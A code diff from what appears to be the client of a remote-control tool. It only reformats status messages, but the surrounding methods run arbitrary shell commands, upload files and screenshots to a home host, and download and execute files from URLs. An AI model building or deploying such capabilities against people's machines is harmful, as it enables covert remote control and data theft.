@@ -126,7 +126,7 @@ class Command:
         r_window.after(30000, r_window.destroy)
         if messagebox.showinfo(text, title):
             r_window.destroy()
-        confirmation = f'[SUCESS {curr_datetime()}] \nMessagebox showed'
+        confirmation = f'[SUCESS] ({curr_datetime()}) \nMessagebox showed'
         return {'confirmation': confirmation}
 
     @staticmethod
@@ -140,19 +140,19 @@ class Command:
             if terminal:
                 try:
                     output = subprocess.check_output(arg_list, shell=True, stderr=subprocess.PIPE).decode(codepage)
-                    confirmation = f'[SUCCESS {curr_datetime()}] \n{output}'
+                    confirmation = f'[SUCCESS] ({curr_datetime()}]) \n{output}'
                 except subprocess.CalledProcessError:
-                    confirmation = f'[FAILED {curr_datetime()}] unknown command'
+                    confirmation = f'[FAILED] ({curr_datetime()}) unknown command'
             else:
                 try:
                     output = subprocess.Popen(arg_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    confirmation = f'[SUCCESS {curr_datetime()}] \n{arg_list[0]} executed'
+                    confirmation = f'[SUCCESS] ({curr_datetime()}) \n{arg_list[0]} executed'
                 except FileNotFoundError as e:
                     print(e)
-                    confirmation = f'[FAILED {curr_datetime()}] executable file not found'
+                    confirmation = f'[FAILED] ({curr_datetime()}) executable file not found'
             return {'confirmation': confirmation}
         else:
-            confirmation = f'[FAILED {curr_datetime()}]'
+            confirmation = f'[FAILED] ({curr_datetime()})'
             return {'confirmation': confirmation}
 
     @staticmethod
@@ -163,13 +163,13 @@ class Command:
                     'file': open(file_path, 'rb')
                 }
                 # say_file = s.post(home_host + '/upload/', files=file, data=payload)
-                confirmation = f'[SUCCESS {curr_datetime()}] \nFile {file_path} uploaded'
+                confirmation = f'[SUCCESS] ({curr_datetime()}) \nFile {file_path} uploaded'
                 return {'confirmation': confirmation, 'file': file}
             else:
-                confirmation = f'[ERROR {curr_datetime()}] \nFile {file_path} not exists'
+                confirmation = f'[ERROR] ({curr_datetime()}) \nFile {file_path} not exists'
                 return {'confirmation': confirmation}
         except IOError:
-            confirmation = f'[ERROR {curr_datetime()}] \nProblem with access to file {file_path}'
+            confirmation = f'[ERROR] ({curr_datetime()}) \nProblem with access to file {file_path}'
             return {'confirmation': confirmation}
 
     @staticmethod
@@ -193,11 +193,11 @@ class Command:
         file = {
             'file': open(temp_dir + screen_name, 'rb')
         }
-        confirmation = f'[SUCCESS {curr_datetime()}] Screeenshot {screen_name}  was made & uploaded'
+        confirmation = f'[SUCCESS] ({curr_datetime()}) Screeenshot {screen_name}  was made & uploaded'
         if 'SUCCESS' in make_screenshot['confirmation']:
             return {'confirmation': confirmation, 'file': file}
         else:
-            confirmation = f'[ERROR {curr_datetime()}] Screeenshot {screen_name}  was not made'
+            confirmation = f'[ERROR] ({curr_datetime()}) Screeenshot {screen_name}  was not made'
             return {'confirmation': confirmation}
 
     @staticmethod
@@ -215,14 +215,14 @@ class Command:
                 }
                 text = Command.run_command(**args_dict)
                 print(text)
-                confirmation = f'[SUCESS {curr_datetime()}] File {url} downloaded, executed'
+                confirmation = f'[SUCESS] ({curr_datetime()}) File {url} downloaded, executed'
                 return {'confirmation': confirmation}
             else:
-                confirmation = f'[SUCESS {curr_datetime()}] File {url} downloaded, not executed'
+                confirmation = f'[SUCESS] ({curr_datetime()}) File {url} downloaded, not executed'
                 return {'confirmation': confirmation}
         except IOError as e:
             print(e)
-            confirmation = f'[ERROR {curr_datetime()}] File {url} not downloaded'
+            confirmation = f'[ERROR] ({curr_datetime()}) File {url} not downloaded'
             return {'confirmation': confirmation}
 
 
